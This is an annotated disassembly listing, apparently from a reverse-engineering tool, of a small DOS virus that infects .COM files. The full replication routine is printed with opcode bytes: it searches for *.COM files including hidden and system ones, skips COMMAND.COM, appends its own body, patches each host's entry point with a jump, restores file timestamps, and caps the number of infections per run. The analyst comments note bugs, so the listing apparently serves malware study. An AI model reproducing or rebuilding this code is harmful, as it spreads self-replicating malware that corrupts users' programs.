                                                                   ;XREF[1,1]:   1000:013a(*),1000:013a(*)
PSP:1000:0000                            DOS_PSP                                                                 ;CP/M-like exit (INT 20h)
   |_PSP:1000:0000            int20           dw          ??
   |_PSP:1000:0002            mem_size        dw          ??
   |_PSP:1000:0004            reserved1       db          ??
   |_PSP:1000:0005            dos_dispa...    db[5]       ??
      |_PSP:1000:0005            [0]             db          ??
      |_PSP:1000:0006            [1]             db          ??
      |_PSP:1000:0007            [2]             db          ??
      |_PSP:1000:0008            [3]             db          ??
      |_PSP:1000:0009            [4]             db          ??
   |_PSP:1000:000a            int22_vector    ddw         ??
   |_PSP:1000:000e            int23_vector    ddw         ??
   |_PSP:1000:0012            int24_vector    ddw         ??
   |_PSP:1000:0016            parent_psp      dw          ??
   |_PSP:1000:0018            jft             db[20]      ??
      |_PSP:1000:0018            [0]             db          ??
      |_PSP:1000:0019            [1]             db          ??
      |_PSP:1000:001a            [2]             db          ??
      |_PSP:1000:001b            [3]             db          ??
      |_PSP:1000:001c            [4]             db          ??
      |_PSP:1000:001d            [5]             db          ??
      |_PSP:1000:001e            [6]             db          ??
      |_PSP:1000:001f            [7]             db          ??
      |_PSP:1000:0020            [8]             db          ??
      |_PSP:1000:0021            [9]             db          ??
      |_PSP:1000:0022            [10]            db          ??
      |_PSP:1000:0023            [11]            db          ??
      |_PSP:1000:0024            [12]            db          ??
      |_PSP:1000:0025            [13]            db          ??
      |_PSP:1000:0026            [14]            db          ??
      |_PSP:1000:0027            [15]            db          ??
      |_PSP:1000:0028            [16]            db          ??
      |_PSP:1000:0029            [17]            db          ??
      |_PSP:1000:002a            [18]            db          ??
      |_PSP:1000:002b            [19]            db          ??
   |_PSP:1000:002c            env_segment     dw          ??
   |_PSP:1000:002e            ss_sp_las...    ddw         ??
   |_PSP:1000:0032            jft_size        dw          ??
   |_PSP:1000:0034            jft_ptr         ddw         ??
   |_PSP:1000:0038            prev_psp        ddw         ??
   |_PSP:1000:003c            reserved2       db[4]       ??
      |_PSP:1000:003c            [0]             db          ??
      |_PSP:1000:003d            [1]             db          ??
      |_PSP:1000:003e            [2]             db          ??
      |_PSP:1000:003f            [3]             db          ??
   |_PSP:1000:0040            dos_version     dw          ??
   |_PSP:1000:0042            reserved3       db[14]      ??
      |_PSP:1000:0042            [0]             db          ??
      |_PSP:1000:0043            [1]             db          ??
      |_PSP:1000:0044            [2]             db          ??
      |_PSP:1000:0045            [3]             db          ??
      |_PSP:1000:0046            [4]             db          ??
      |_PSP:1000:0047            [5]             db          ??
      |_PSP:1000:0048            [6]             db          ??
      |_PSP:1000:0049            [7]             db          ??
      |_PSP:1000:004a            [8]             db          ??
      |_PSP:1000:004b            [9]             db          ??
      |_PSP:1000:004c            [10]            db          ??
      |_PSP:1000:004d            [11]            db          ??
      |_PSP:1000:004e            [12]            db          ??
      |_PSP:1000:004f            [13]            db          ??
   |_PSP:1000:0050            dos_call        db[3]       ??
      |_PSP:1000:0050            [0]             db          ??
      |_PSP:1000:0051            [1]             db          ??
      |_PSP:1000:0052            [2]             db          ??
   |_PSP:1000:0053            reserved4       db[2]       ??
      |_PSP:1000:0053            [0]             db          ??
      |_PSP:1000:0054            [1]             db          ??
   |_PSP:1000:0055            reserved5       db[7]       ??
      |_PSP:1000:0055            [0]             db          ??
      |_PSP:1000:0056            [1]             db          ??
      |_PSP:1000:0057            [2]             db          ??
      |_PSP:1000:0058            [3]             db          ??
      |_PSP:1000:0059            [4]             db          ??
      |_PSP:1000:005a            [5]             db          ??
      |_PSP:1000:005b            [6]             db          ??
   |_PSP:1000:005c            fcb1            db[16]      ??
      |_PSP:1000:005c            [0]             db          ??
      |_PSP:1000:005d            [1]             db          ??
      |_PSP:1000:005e            [2]             db          ??
      |_PSP:1000:005f            [3]             db          ??
      |_PSP:1000:0060            [4]             db          ??
      |_PSP:1000:0061            [5]             db          ??
      |_PSP:1000:0062            [6]             db          ??
      |_PSP:1000:0063            [7]             db          ??
      |_PSP:1000:0064            [8]             db          ??
      |_PSP:1000:0065            [9]             db          ??
      |_PSP:1000:0066            [10]            db          ??
      |_PSP:1000:0067            [11]            db          ??
      |_PSP:1000:0068            [12]            db          ??
      |_PSP:1000:0069            [13]            db          ??
      |_PSP:1000:006a            [14]            db          ??
      |_PSP:1000:006b            [15]            db          ??
   |_PSP:1000:006c            fcb2            db[20]      ??
      |_PSP:1000:006c            [0]             db          ??
      |_PSP:1000:006d            [1]             db          ??
      |_PSP:1000:006e            [2]             db          ??
      |_PSP:1000:006f            [3]             db          ??
      |_PSP:1000:0070            [4]             db          ??
      |_PSP:1000:0071            [5]             db          ??
      |_PSP:1000:0072            [6]             db          ??
      |_PSP:1000:0073            [7]             db          ??
      |_PSP:1000:0074            [8]             db          ??
      |_PSP:1000:0075            [9]             db          ??
      |_PSP:1000:0076            [10]            db          ??
      |_PSP:1000:0077            [11]            db          ??
      |_PSP:1000:0078            [12]            db          ??
      |_PSP:1000:0079            [13]            db          ??
      |_PSP:1000:007a            [14]            db          ??
      |_PSP:1000:007b            [15]            db          ??
      |_PSP:1000:007c            [16]            db          ??
      |_PSP:1000:007d            [17]            db          ??
      |_PSP:1000:007e            [18]            db          ??
      |_PSP:1000:007f            [19]            db          ??
   |_PSP:1000:0080            cmdtail_len     db          ??
   |_PSP:1000:0081            cmdtail         char[127]   ??
      |_PSP:1000:0081            [0]             char        ??
      |_PSP:1000:0082            [1]             char        ??
      |_PSP:1000:0083            [2]             char        ??
      |_PSP:1000:0084            [3]             char        ??
      |_PSP:1000:0085            [4]             char        ??
      |_PSP:1000:0086            [5]             char        ??
      |_PSP:1000:0087            [6]             char        ??
      |_PSP:1000:0088            [7]             char        ??
      |_PSP:1000:0089            [8]             char        ??
      |_PSP:1000:008a            [9]             char        ??
      |_PSP:1000:008b            [10]            char        ??
      |_PSP:1000:008c            [11]            char        ??
      |_PSP:1000:008d            [12]            char        ??
      |_PSP:1000:008e            [13]            char        ??
      |_PSP:1000:008f            [14]            char        ??
      |_PSP:1000:0090            [15]            char        ??
      |_PSP:1000:0091            [16]            char        ??
      |_PSP:1000:0092            [17]            char        ??
      |_PSP:1000:0093            [18]            char        ??
      |_PSP:1000:0094            [19]            char        ??
      |_PSP:1000:0095            [20]            char        ??
      |_PSP:1000:0096            [21]            char        ??
      |_PSP:1000:0097            [22]            char        ??
      |_PSP:1000:0098            [23]            char        ??
      |_PSP:1000:0099            [24]            char        ??
      |_PSP:1000:009a            [25]            char        ??
      |_PSP:1000:009b            [26]            char        ??
      |_PSP:1000:009c            [27]            char        ??
      |_PSP:1000:009d            [28]            char        ??
      |_PSP:1000:009e            [29]            char        ??
      |_PSP:1000:009f            [30]            char        ??
      |_PSP:1000:00a0            [31]            char        ??
      |_PSP:1000:00a1            [32]            char        ??
      |_PSP:1000:00a2            [33]            char        ??
      |_PSP:1000:00a3            [34]            char        ??
      |_PSP:1000:00a4            [35]            char        ??
      |_PSP:1000:00a5            [36]            char        ??
      |_PSP:1000:00a6            [37]            char        ??
      |_PSP:1000:00a7            [38]            char        ??
      |_PSP:1000:00a8            [39]            char        ??
      |_PSP:1000:00a9            [40]            char        ??
      |_PSP:1000:00aa            [41]            char        ??
      |_PSP:1000:00ab            [42]            char        ??
      |_PSP:1000:00ac            [43]            char        ??
      |_PSP:1000:00ad            [44]            char        ??
      |_PSP:1000:00ae            [45]            char        ??
      |_PSP:1000:00af            [46]            char        ??
      |_PSP:1000:00b0            [47]            char        ??
      |_PSP:1000:00b1            [48]            char        ??
      |_PSP:1000:00b2            [49]            char        ??
      |_PSP:1000:00b3            [50]            char        ??
      |_PSP:1000:00b4            [51]            char        ??
      |_PSP:1000:00b5            [52]            char        ??
      |_PSP:1000:00b6            [53]            char        ??
      |_PSP:1000:00b7            [54]            char        ??
      |_PSP:1000:00b8            [55]            char        ??
      |_PSP:1000:00b9            [56]            char        ??
      |_PSP:1000:00ba            [57]            char        ??
      |_PSP:1000:00bb            [58]            char        ??
      |_PSP:1000:00bc            [59]            char        ??
      |_PSP:1000:00bd            [60]            char        ??
      |_PSP:1000:00be            [61]            char        ??
      |_PSP:1000:00bf            [62]            char        ??
      |_PSP:1000:00c0            [63]            char        ??
      |_PSP:1000:00c1            [64]            char        ??
      |_PSP:1000:00c2            [65]            char        ??
      |_PSP:1000:00c3            [66]            char        ??
      |_PSP:1000:00c4            [67]            char        ??
      |_PSP:1000:00c5            [68]            char        ??
      |_PSP:1000:00c6            [69]            char        ??
      |_PSP:1000:00c7            [70]            char        ??
      |_PSP:1000:00c8            [71]            char        ??
      |_PSP:1000:00c9            [72]            char        ??
      |_PSP:1000:00ca            [73]            char        ??
      |_PSP:1000:00cb            [74]            char        ??
      |_PSP:1000:00cc            [75]            char        ??
      |_PSP:1000:00cd            [76]            char        ??
      |_PSP:1000:00ce            [77]            char        ??
      |_PSP:1000:00cf            [78]            char        ??
      |_PSP:1000:00d0            [79]            char        ??
      |_PSP:1000:00d1            [80]            char        ??
      |_PSP:1000:00d2            [81]            char        ??
      |_PSP:1000:00d3            [82]            char        ??
      |_PSP:1000:00d4            [83]            char        ??
      |_PSP:1000:00d5            [84]            char        ??
      |_PSP:1000:00d6            [85]            char        ??
      |_PSP:1000:00d7            [86]            char        ??
      |_PSP:1000:00d8            [87]            char        ??
      |_PSP:1000:00d9            [88]            char        ??
      |_PSP:1000:00da            [89]            char        ??
      |_PSP:1000:00db            [90]            char        ??
      |_PSP:1000:00dc            [91]            char        ??
      |_PSP:1000:00dd            [92]            char        ??
      |_PSP:1000:00de            [93]            char        ??
      |_PSP:1000:00df            [94]            char        ??
      |_PSP:1000:00e0            [95]            char        ??
      |_PSP:1000:00e1            [96]            char        ??
      |_PSP:1000:00e2            [97]            char        ??
      |_PSP:1000:00e3            [98]            char        ??
      |_PSP:1000:00e4            [99]            char        ??
      |_PSP:1000:00e5            [100]           char        ??
      |_PSP:1000:00e6            [101]           char        ??
      |_PSP:1000:00e7            [102]           char        ??
      |_PSP:1000:00e8            [103]           char        ??
      |_PSP:1000:00e9            [104]           char        ??
      |_PSP:1000:00ea            [105]           char        ??
      |_PSP:1000:00eb            [106]           char        ??
      |_PSP:1000:00ec            [107]           char        ??
      |_PSP:1000:00ed            [108]           char        ??
      |_PSP:1000:00ee            [109]           char        ??
      |_PSP:1000:00ef            [110]           char        ??
      |_PSP:1000:00f0            [111]           char        ??
      |_PSP:1000:00f1            [112]           char        ??
      |_PSP:1000:00f2            [113]           char        ??
      |_PSP:1000:00f3            [114]           char        ??
      |_PSP:1000:00f4            [115]           char        ??
      |_PSP:1000:00f5            [116]           char        ??
      |_PSP:1000:00f6            [117]           char        ??
      |_PSP:1000:00f7            [118]           char        ??
      |_PSP:1000:00f8            [119]           char        ??
      |_PSP:1000:00f9            [120]           char        ??
      |_PSP:1000:00fa            [121]           char        ??
      |_PSP:1000:00fb            [122]           char        ??
      |_PSP:1000:00fc            [123]           char        ??
      |_PSP:1000:00fd            [124]           char        ??
      |_PSP:1000:00fe            [125]           char        ??
      |_PSP:1000:00ff            [126]           char        ??
                                     COM_ENTRY_POINT:              ;XREF[2]:     1000:0111(*),1000:0142(*)
File body:1000:0100      eb07            JMP         VIRUS_START
File body:1000:0102      90              NOP
File body:1000:0103      90              NOP
File body:1000:0104      90              NOP
                                     ;Also used as buffer for testing the executable type
                                     SAVE_ORIG_ENTRY_POINT_BYTES:  ;XREF[8,3]:   1000:0114(*),1000:018f(*),1000:019e(*),1000:01bf(*),
                                                                   ;             1000:01e2(*),1000:01e6(*),1000:01eb(*),1000:01f0(*),
                                                                   ;             1000:019e(*),1000:01e2(*),1000:01eb(*)
File body:1000:0105      cd209001        db[4]
   |_File body:1000:0105      [0]             db          CDh
   |_File body:1000:0106      [1]             db          20h
   |_File body:1000:0107      [2]             db          90h
   |_File body:1000:0108      [3]             db          1h
                                     VIRUS_START:                  ;XREF[2]:     1000:0100(j),1000:01ca(*)
File body:1000:0109      e80000          CALL        FIND_BASE_ADDRESS
                                     FIND_BASE_ADDRESS:            ;XREF[1]:     1000:0109(j)
File body:1000:010c      5d              POP         BP
                                     ;************************************************************************************************************************************************************
                                     ;*  Bug: operand should be 0x10c                                                                                                                            *
                                     ;*  Analysis will assume the correct value                                                                                                                  *
                                     ;************************************************************************************************************************************************************
File body:1000:010d      81ed0b01        SUB         BP,0x10b
                                     RESTORE_ORIG_ENTRY_POINT:
File body:1000:0111      bf0001          MOV         DI,COM_ENTRY_POINT
File body:1000:0114      8db60501        LEA         SI,[BP + SAVE_ORIG_ENTRY_POINT_BYTES]
File body:1000:0118      b90400          MOV         CX,0x4
File body:1000:011b      fc              CLD
File body:1000:011c      f3a4            MOVSB.REP   ES:DI,SI
File body:1000:011e      b41a            MOV         AH,SET_DTA
File body:1000:0120      8d961202        LEA         DX,[BP + DTA_BUFFER]
File body:1000:0124      cd21            INT         0x21
File body:1000:0126      c6863d0200      MOV         byte ptr [BP + INFECTION_COUNTER],0x0
File body:1000:012b      b44e            MOV         AH,FIND_FIRST_FILE
File body:1000:012d      8db63002        LEA         SI,[BP + DTA_BUFFER.filename[0]]
File body:1000:0131      8d960c02        LEA         DX,[BP + COM_FILES_PATTERN]                                 ;= "*.COM"
File body:1000:0135      52              PUSH        DX
File body:1000:0136      eb30            JMP         INVOKE_FILE_SEARCH
                                     EXIT_PROCEDURE:               ;XREF[1]:     1000:0209(j)
File body:1000:0138      b41a            MOV         AH,SET_DTA
File body:1000:013a      ba8000          MOV         DX,PSP:DOS_PSP_1000_0000.cmdtail_len                        ;Should set 0x81 instead of 0x80
File body:1000:013d      cd21            INT         0x21
File body:1000:013f      bcfeff          MOV         SP,0xfffe
File body:1000:0142      bd0001          MOV         BP,COM_ENTRY_POINT
File body:1000:0145      55              PUSH        BP
File body:1000:0146      33ed            XOR         BP,BP
File body:1000:0148      c3              RET
                                     CLEAN_AND_CLOSE:              ;XREF[6]:     1000:0186(j),1000:019c(j),1000:01a3(j),1000:01ac(j),
                                                                   ;             1000:01b9(j),1000:0206(j)
File body:1000:0149      0bdb            OR          BX,BX                                                       ;Clean if there was a file handle
File body:1000:014b      7419            JZ          FIND_NEXT_FILE
File body:1000:014d      b500            MOV         CH,0x0                                                      ;Redundant (overwritten at 0x156)
File body:1000:014f      8a8e2702        MOV         CL,byte ptr [BP + DTA_BUFFER.attribute]                     ;(same)
File body:1000:0153      b80157          MOV         AX,SET_FILE_TIMESTAMP
File body:1000:0156      8b8e2802        MOV         CX,word ptr [BP + DTA_BUFFER.time]
File body:1000:015a      8b962a02        MOV         DX,word ptr [BP + DTA_BUFFER.date]
File body:1000:015e      cd21            INT         0x21
File body:1000:0160      b43e            MOV         AH,CLOSE_FILE
File body:1000:0162      cd21            INT         0x21
File body:1000:0164      33db            XOR         BX,BX                                                       ;Redundant (reset again at 0x16d)
                                     FIND_NEXT_FILE:               ;XREF[1]:     1000:014b(j)
File body:1000:0166      b44f            MOV         AH,FIND_NEXT_FILE
                                     INVOKE_FILE_SEARCH:           ;XREF[1]:     1000:0136(j)
File body:1000:0168      5a              POP         DX
File body:1000:0169      52              PUSH        DX
File body:1000:016a      b90700          MOV         CX,0x7                                                      ;Include: Readonly, hidden, system
File body:1000:016d      33db            XOR         BX,BX
File body:1000:016f      cd21            INT         0x21
File body:1000:0171      730c            JNC         OPEN_CANDIDATE_FOR_INFECTION
File body:1000:0173      e99300          JMP         JMP_TO_EXIT_PROCEDURE
File body:1000:0176      ff4720422...    ds          FFh,"G B 1.2",FFh
                                     OPEN_CANDIDATE_FOR_INFECTION: ;XREF[1]:     1000:0171(j)
File body:1000:017f      8bd6            MOV         DX,SI
File body:1000:0181      b8023d          MOV         AX,OPEN_FILE_RW
File body:1000:0184      cd21            INT         0x21
File body:1000:0186      72c1            JC          CLEAN_AND_CLOSE
File body:1000:0188      8bd8            MOV         BX,AX
File body:1000:018a      b43f            MOV         AH,READ_FILE
File body:1000:018c      b90400          MOV         CX,0x4
File body:1000:018f      8d960501        LEA         DX,[BP + SAVE_ORIG_ENTRY_POINT_BYTES]
File body:1000:0193      cd21            INT         0x21
File body:1000:0195      8b863502        MOV         AX,word ptr [BP + DTA_BUFFER.filename[5]]
File body:1000:0199      3d4e44          CMP         AX,0x444e                                                   ;Check COMMAND.COM via "ND"
File body:1000:019c      74ab            JZ          CLEAN_AND_CLOSE
File body:1000:019e      80be080101      CMP         byte ptr [BP + SAVE_ORIG_ENTRY_POINT_BYTES[3]],0x1
File body:1000:01a3      74a4            JZ          CLEAN_AND_CLOSE
File body:1000:01a5      8b862c02        MOV         AX,word ptr [BP + DTA_BUFFER.size]
File body:1000:01a9      3d4b01          CMP         AX,0x14b
File body:1000:01ac      729b            JC          CLEAN_AND_CLOSE
File body:1000:01ae      b80242          MOV         AX,SEEK_FROM_END
File body:1000:01b1      99              CWD
File body:1000:01b2      33c9            XOR         CX,CX                                                       ;Seek to end (DX=0, from above)
File body:1000:01b4      cd21            INT         0x21
File body:1000:01b6      3d00fd          CMP         AX,MAX_INFECTABLE_FILE_SIZE
File body:1000:01b9      778e            JA          CLEAN_AND_CLOSE
File body:1000:01bb      89863e02        MOV         word ptr [BP + FILE_SIZE],AX
File body:1000:01bf      8d960501        LEA         DX,[BP + SAVE_ORIG_ENTRY_POINT_BYTES]
File body:1000:01c3      b90400          MOV         CX,0x4
File body:1000:01c6      b440            MOV         AH,WRITE_FILE
File body:1000:01c8      cd21            INT         0x21
File body:1000:01ca      8d960901        LEA         DX,[BP + VIRUS_START]
File body:1000:01ce      b92a01          MOV         CX,0x12a                                                    ;Unnecessarily includes part of buffers
File body:1000:01d1      b440            MOV         AH,WRITE_FILE
File body:1000:01d3      cd21            INT         0x21
File body:1000:01d5      b80042          MOV         AX,SEEK_FROM_START
File body:1000:01d8      99              CWD                                                                     ;Sets DX to 0
File body:1000:01d9      33c9            XOR         CX,CX
File body:1000:01db      cd21            INT         0x21
File body:1000:01dd      8b863e02        MOV         AX,word ptr [BP + FILE_SIZE]
File body:1000:01e1      40              INC         AX
File body:1000:01e2      89860601        MOV         word ptr [BP + SAVE_ORIG_ENTRY_POINT_BYTES[1]],AX
File body:1000:01e6      c6860501e9      MOV         byte ptr [BP + SAVE_ORIG_ENTRY_POINT_BYTES],NEAR_JUMP
File body:1000:01eb      c686080101      MOV         byte ptr [BP + SAVE_ORIG_E...,INFECTION_MARKER
File body:1000:01f0      8d960501        LEA         DX,[BP + SAVE_ORIG_ENTRY_POINT_BYTES]
File body:1000:01f4      b440            MOV         AH,WRITE_FILE
File body:1000:01f6      b90400          MOV         CX,0x4
File body:1000:01f9      cd21            INT         0x21
File body:1000:01fb      fe863d02        INC         byte ptr [BP + INFECTION_COUNTER]
File body:1000:01ff      80be3d0206      CMP         byte ptr [BP + INFECTION_COUNTER],MAX_INFECTIONS
File body:1000:0204      7303            JNC         JMP_TO_EXIT_PROCEDURE
File body:1000:0206      e940ff          JMP         CLEAN_AND_CLOSE
                                     JMP_TO_EXIT_PROCEDURE:        ;XREF[2]:     1000:0173(j),1000:0204(j)
File body:1000:0209      e92cff          JMP         EXIT_PROCEDURE
                                     COM_FILES_PATTERN:            ;XREF[1]:     1000:0131(*)
File body:1000:020c      2a2e434f4d00    ds          "*.COM"
                                     DTA_BUFFER:                   ;XREF[7,6]:   1000:0120(*),1000:012d(*),1000:014f(*),1000:0156(*),
                                                                   ;             1000:015a(*),1000:0195(*),1000:01a5(*),1000:012d(*),
                                                                   ;             1000:014f(*),1000:0156(*),1000:015a(*),1000:0195(*),
                                                                   ;             1000:01a5(*)
File body:1000:0212      000000000...    DOS_DTA                                                                 ;Reserved (DOS internal use)
   |_File body:1000:0212      reserved        db[21]
      |_File body:1000:0212      [0]             db          0h
      |_File body:1000:0213      [1]             db          0h
      |_File body:1000:0214      [2]             db          0h
      |_File body:1000:0215      [3]             db          0h
      |_File body:1000:0216      [4]             db          0h
      |_File body:1000:0217      [5]             db          0h
      |_File body:1000:0218      [6]             db          0h
      |_File body:1000:0219      [7]             db          0h
      |_File body:1000:021a      [8]             db          0h
      |_File body:1000:021b      [9]             db          0h
      |_File body:1000:021c      [10]            db          0h
      |_File body:1000:021d      [11]            db          0h
      |_File body:1000:021e      [12]            db          0h
      |_File body:1000:021f      [13]            db          0h
      |_File body:1000:0220      [14]            db          0h
      |_File body:1000:0221      [15]            db          0h
      |_File body:1000:0222      [16]            db          0h
      |_File body:1000:0223      [17]            db          0h
      |_File body:1000:0224      [18]            db          0h
      |_File body:1000:0225      [19]            db          0h
      |_File body:1000:0226      [20]            db          0h
   |_File body:1000:0227      attribute       db          0h
   |_File body:1000:0228      time            dw          0h
   |_File body:1000:022a      date            dw          0h
   |_File body:1000:022c      size            ddw         0h
   |_File body:1000:0230      filename        char[13]    ""
      |_File body:1000:0230      [0]             char        00h
      |_File body:1000:0231      [1]             char        00h
      |_File body:1000:0232      [2]             char        00h
      |_File body:1000:0233      [3]             char        00h
      |_File body:1000:0234      [4]             char        00h
      |_File body:1000:0235      [5]             char        00h
      |_File body:1000:0236      [6]             char        00h
      |_File body:1000:0237      [7]             char        00h
      |_File body:1000:0238      [8]             char        00h
      |_File body:1000:0239      [9]             char        00h
      |_File body:1000:023a      [10]            char        00h
      |_File body:1000:023b      [11]            char        00h
      |_File body:1000:023c      [12]            char        00h
                                     INFECTION_COUNTER:            ;XREF[3]:     1000:0126(*),1000:01fb(*),1000:01ff(*)
File body:1000:023d      00              ??          00h
                                     FILE_SIZE:                    ;XREF[2]:     1000:01bb(*),1000:01dd(*)
File body:1000:023e      0000            dw          0h